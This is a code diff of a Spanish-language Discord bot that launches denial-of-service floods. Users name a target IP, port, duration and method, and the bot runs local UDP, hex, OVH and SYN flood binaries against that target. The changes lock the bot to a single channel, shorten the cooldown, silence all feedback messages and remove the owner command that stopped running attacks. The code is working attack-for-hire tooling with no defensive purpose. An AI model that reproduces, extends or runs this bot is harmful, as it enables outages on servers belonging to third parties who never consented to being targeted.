@@ -7,6 +7,9 @@ import tempfile
 # Cargar el token desde la variable de entorno
 TOKEN = os.getenv('KEYS')
 
+# CHANNEL ID (¡PON EL ID DEL CANAL AQUÍ!)
+CHANNEL_ID = 1459317728824397977
+
 # Imprimir información de configuración (con mejor formato)
 print("\n" + "="*60)
 print("🔍 CONFIGURANDO BOT")
@@ -54,7 +57,7 @@ ataque_en_curso = False
 proceso_en_curso = None
 
 # Duración del cooldown (en segundos)
-COOLDOWN_DURATION = 40
+COOLDOWN_DURATION = 20
 MAX_ATTACK_DURATION = 80
 
 # Evento que se activa cuando el bot está listo
@@ -64,8 +67,13 @@ async def on_ready():
     print(f'Avalon Bot Free')
     await bot.change_presence(activity=discord.Game(name="Avalon Bot Free"))
 
+# Verificar el canal antes de procesar comandos
+@bot.check
+async def check_channel(ctx):
+    return ctx.channel.id == CHANNEL_ID
+
 # Función para ejecutar un ataque (ahora con control de errores y mensajes)
-async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
+async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int, metodo: str):
     global ataque_en_curso, proceso_en_curso
 
     try:
@@ -84,10 +92,6 @@ async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int):
         print(f"Attack method '{comando}' finished")
     except Exception as e:
         print(f"Error al ejecutar el ataque: {e}")
-        try:
-            await ctx.send(f'Error al ejecutar el ataque: {e}')
-        except:
-            pass
     finally:
         # Independientemente de si el ataque tuvo éxito o no,
         # se levanta la bandera de ataque en curso.
@@ -132,44 +136,36 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
 
     # 1. Validaciones iniciales
     if ip is None or port is None or tiempo is None:
-        await enviar_mensaje_con_formato(ctx, "Error", f"!{metodo} ip port time", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     try:
         port_int = int(port)
         tiempo_int = int(tiempo)
     except ValueError:
-        await enviar_mensaje_con_formato(ctx, "Error", "Puerto y tiempo deben ser números de almenos 2 digitos", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     if port_int < 1 or port_int > 65535:
-        await enviar_mensaje_con_formato(ctx, "Error", "Puerto no válido", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     if tiempo_int <= 0:
-        await enviar_mensaje_con_formato(ctx, "Error", "El tiempo tiene que ser mayor a 0", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     if tiempo_int > MAX_ATTACK_DURATION:
-        await enviar_mensaje_con_formato(ctx, "Error", f"El tiempo máximo para usuarios free es de {MAX_ATTACK_DURATION} segundos", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     # 2. Cooldown y ataque en curso
     if user_id in cooldowns and cooldowns[user_id] > asyncio.get_event_loop().time():
-        tiempo_restante = cooldowns[user_id] - asyncio.get_event_loop().time()
-        await enviar_mensaje_con_formato(ctx, "Cooldown", f"Debes esperar {tiempo_restante:.2f} segundos para volver a atacar", discord.Color.orange())
-        return
+        return # No enviar mensaje de cooldown
 
     if ataque_en_curso:
-        await enviar_mensaje_con_formato(ctx, "Error", "Ya hay un ataque en curso, espera a que termine", discord.Color.red())
-        return
+        return # No enviar mensaje de error
 
     # 3. Preparar y ejecutar el ataque
     comando = None
     if metodo == 'udp':
         comando = f'./udp {ip} {port_int} {tiempo_int}'
     elif metodo == 'hex':
-        comando = f'./hex {ip} {port_int} -t 32 -s 64 -d {tiempo_int}'
+        comando = f'./hex {ip} {port_int} {tiempo_int}'
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhudp':
@@ -179,67 +175,16 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
     elif metodo == 'syn':
         comando = f'./tcp-syn {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
     else:
-        await enviar_mensaje_con_formato(ctx, "Error", "Método no válido. Usa !methods para ver la lista de métodos disponibles.", discord.Color.red())
-        return
-
-    # Enviar mensaje de éxito con formato
-    embed = discord.Embed(
-        title="¡Ataque Iniciado!",
-        description=f"**TargetIP/Port:** {ip}:{port_int}\n**Método:** {metodo.upper()}\n**Tiempo:** {tiempo_int}",
-        color=discord.Color.green()
-    )
-    embed.set_footer(text=f"Ataque enviado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
-    await ctx.send(embed=embed)
+        return # No enviar mensaje de error
 
     # Establecer cooldown y ejecutar ataque
     cooldowns[user_id] = asyncio.get_event_loop().time() + tiempo_int + COOLDOWN_DURATION
-    await ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int)
+    await ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int, metodo)
 
 # Comando para mostrar los métodos disponibles
 @bot.command(name='methods')
 async def show_methods(ctx):
-    embed = discord.Embed(
-        title="Metodos Disponibles",
-        description="Se añadiran mas metodos en el futuro:",
-        color=discord.Color.blue()
-    )
-
-    embed.add_field(name="L4 UDP Protocol", value="`• udp`\n`• hex`\n`• udppps`\n`• ovhudp`", inline=False)
-    embed.add_field(name="L4 TCP Protocol", value="`• ovhtcp`\n`• syn`", inline=False)
-
-    embed.set_footer(text=f"Solicitado por {ctx.author.name}#{ctx.author.discriminator}", icon_url=ctx.author.avatar.url)
-    await ctx.send(embed=embed)
-
-# Comando para detener todos los ataques (solo para owners)
-@bot.command(name='stopall')
-async def stopall_command(ctx):
-    global ataque_en_curso, proceso_en_curso
-
-    if ctx.author.id not in OWNER_IDS:
-        await enviar_mensaje_con_formato(ctx, "Error", "No puedes ejecutar este comando", discord.Color.red())
-        return
-
-    if proceso_en_curso:
-        try:
-            proceso_en_curso.terminate()  # Envía SIGTERM (intento de terminación suave)
-            await proceso_en_curso.wait()   # Espera a que el proceso termine
-            print("Attack Finish")
-        except ProcessLookupError:
-            print("El ataque ya se detuvo")
-        except Exception as e:
-            print(f"Error al terminar al detener: {e}")
-            await enviar_mensaje_con_formato(ctx, "Error", f"Error al detener el ataque: {e}", discord.Color.red())
-
-        proceso_en_curso = None
-        ataque_en_curso = False
-    else:
-        await enviar_mensaje_con_formato(ctx, "Información", "Ya no hay ataques en curso", discord.Color.yellow())
-
-    #Por ahora, solo reseteamos el cooldown para permitir nuevos ataques
-    cooldowns.clear()
-    ataque_en_curso = False
-
-    await enviar_mensaje_con_formato(ctx, "Ataques detenidos con exito", discord.Color.green())
+    return # No enviar mensaje
 
 # Iniciar el bot
 print("🚀 INICIANDO BOT CON TODOS LOS MÉTODOS")
